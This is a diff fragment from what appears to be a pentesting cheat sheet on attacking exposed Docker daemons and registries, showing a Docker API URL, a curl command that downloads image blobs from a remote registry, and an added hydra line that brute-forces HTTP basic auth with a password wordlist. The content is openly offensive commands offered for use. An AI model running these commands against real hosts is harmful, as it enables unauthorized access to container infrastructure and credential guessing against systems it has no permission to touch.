@@ -181,6 +181,8 @@ http://Remote_IP:2375/containers/0bb824614788cced1fa17ed4539477bca425b62d9d52d91
 /v2/alpine/manifests/latest  
 curl remote_ip:port/v2/alpine/blobs/sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935 --output 1.tar
 
+#if there is basic auth on the endpint 
+hydra -l {username} -P wordlist REMOTE-IP -s 5000 https-get
 
 ```
 
